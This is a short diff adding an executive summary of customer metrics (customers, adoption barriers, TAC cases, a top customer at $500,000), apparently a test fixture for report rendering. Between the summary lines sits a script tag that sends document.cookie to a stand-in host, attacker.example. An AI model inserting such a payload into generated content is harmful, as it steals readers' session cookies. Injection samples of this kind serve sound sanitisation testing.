@@ -1,0 +1,6 @@
+Executive summary for the 90-day window: 12 customers, 24 adoption
+barriers, 31 TAC cases.
+
+<script>fetch('https://attacker.example/exfil?d='+document.cookie)</script>
+
+The portfolio's top customer is Acme Corp at $500,000.
